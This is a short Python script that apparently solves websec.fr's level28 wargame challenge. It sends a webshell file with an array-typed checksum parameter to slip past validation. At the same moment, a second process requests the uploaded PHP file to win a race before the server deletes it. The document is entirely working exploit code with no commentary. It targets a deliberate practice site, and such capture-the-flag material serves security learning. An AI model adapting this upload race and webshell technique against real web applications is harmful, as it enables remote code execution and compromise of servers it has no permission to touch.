from requests import *
from multiprocessing import Process
import time

md5ip = 'f3959b484667e8ab56a4e0cafba2b430'
webshell = 'shell.php'

def uploadWebshell():
    url = 'https://websec.fr/level28/index.php'

    files = {'flag_file': (webshell, open(webshell, 'rb'), 'application/octet-stream')}
    data = {'checksum[]': '123', 'submit': 'Upload and check'}

    r = post(url, files = files, data = data)
    print('one')

def executeWebshell():
    time.sleep(0.1)
    url = 'https://websec.fr/level28/{0}.php'.format(md5ip)
    r = get(url)
    print(r.text)

def main():
    p1 = Process(target = uploadWebshell)
    p2 = Process(target = executeWebshell)

    p1.start()
    p2.start()

if __name__ == '__main__':
    main()

